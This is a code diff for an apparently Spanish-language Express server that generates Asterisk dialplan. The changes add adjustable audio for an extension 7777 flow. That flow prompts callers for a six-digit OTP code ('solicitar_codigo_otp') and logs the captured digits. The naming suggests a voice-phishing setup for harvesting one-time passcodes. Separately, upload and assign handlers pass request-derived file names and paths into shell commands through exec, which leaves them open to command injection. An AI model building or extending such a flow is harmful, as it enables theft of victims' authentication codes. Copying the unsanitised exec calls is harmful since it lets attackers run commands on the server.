@@ -640,11 +640,14 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Answer()\n`;
   dialplanContent += ` same => n,Wait(1)\n`;
   dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${FINAL_AGENT}" != ""]?\${FINAL_AGENT}:1001)})\n`;
+  dialplanContent += ` same => n,Set(AUDIO_7777=\${DB(ivr_vars/7777_intro)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/bienvenida_7777))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/solicitar_codigo_otp))\n`;
   dialplanContent += ` same => n,Playback(beep)\n`;
-  dialplanContent += ` same => n,Read(USER_DIGITS,custom/solicitar_codigo_otp,6,,2,12)\n`;
+  dialplanContent += ` same => n,Read(USER_DIGITS,\${AUDIO_7777},6,,2,15)\n`;
   dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?captura_ok)\n`;
   dialplanContent += ` same => n,Playback(beep)\n`;
-  dialplanContent += ` same => n,Read(USER_DIGITS,beep,6,,2,8)\n`;
+  dialplanContent += ` same => n,Read(USER_DIGITS,beep,6,,2,10)\n`;
   dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" = ""]?captura_timeout)\n\n`;
 
   dialplanContent += ` same => n(captura_ok),NoOp(=== [CAPTURA-7777] DIGITOS RECIBIDOS: \${USER_DIGITS} ===)\n`;
@@ -1726,6 +1729,14 @@ app.post('/api/asterisk/audio/upload', express.json({ limit: '50mb' }), async (r
         }
         exec(`asterisk -rx 'dialplan reload'`, () => {});
         console.log(`[AUDIO ASSIGNED] custom/${cleanBaseName} asignado como audio de transferencia a asesor.`);
+      } else if (category === 'welcome_7777' || cleanBaseName.includes('7777')) {
+        exec(`asterisk -rx 'database put ivr_vars 7777_intro "custom/${cleanBaseName}"'`, () => {});
+        exec(`asterisk -rx 'database put ivr_vars 7777_prompt "custom/${cleanBaseName}"'`, () => {});
+        try {
+          fs.copyFileSync(targetPath, path.join(SOUNDS_CUSTOM_DIR, 'bienvenida_7777.wav'));
+        } catch (_) {}
+        exec(`asterisk -rx 'dialplan reload'`, () => {});
+        console.log(`[AUDIO ASSIGNED 7777] custom/${cleanBaseName} asignado como bienvenida de extensión 7777.`);
       }
     };
 
@@ -1821,6 +1832,17 @@ app.post('/api/asterisk/audio/assign', (req, res) => {
       for (const tgt of targets) {
         commands.push(`database put ivr_vars ${tgt}_wait "${cleanPath}"`);
       }
+    } else if (role === 'welcome_7777' || role === '7777' || role === 'capture_7777') {
+      lastAssigned7777Audio = cleanPath;
+      commands.push(`database put ivr_vars 7777_intro "${cleanPath}"`);
+      commands.push(`database put ivr_vars 7777_prompt "${cleanPath}"`);
+      try {
+        const srcFile = path.join(SOUNDS_CUSTOM_DIR, `${cleanPath.replace(/^custom\//, '')}.wav`);
+        const dstFile = path.join(SOUNDS_CUSTOM_DIR, 'bienvenida_7777.wav');
+        if (fs.existsSync(srcFile)) {
+          fs.copyFileSync(srcFile, dstFile);
+        }
+      } catch (_) {}
     }
 
     for (const cmd of commands) {
@@ -1838,6 +1860,27 @@ app.post('/api/asterisk/audio/assign', (req, res) => {
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message });
   }
+});
+
+let lastAssigned7777Audio = 'custom/solicitar_codigo_otp';
+
+// Endpoint to retrieve currently assigned audio for extension 7777
+app.get('/api/asterisk/audio/current-7777', (req, res) => {
+  exec(`asterisk -rx 'database get ivr_vars 7777_intro'`, (err, stdout) => {
+    let currentAudio = lastAssigned7777Audio;
+    if (!err && stdout && stdout.includes('Value:')) {
+      const match = stdout.match(/Value:\s*([^\r\n]+)/);
+      if (match && match[1]) {
+        currentAudio = match[1].trim();
+        lastAssigned7777Audio = currentAudio;
+      }
+    }
+    res.json({
+      success: true,
+      currentAudio,
+      defaultAudio: 'custom/solicitar_codigo_otp'
+    });
+  });
 });
 
 // Delete an audio file
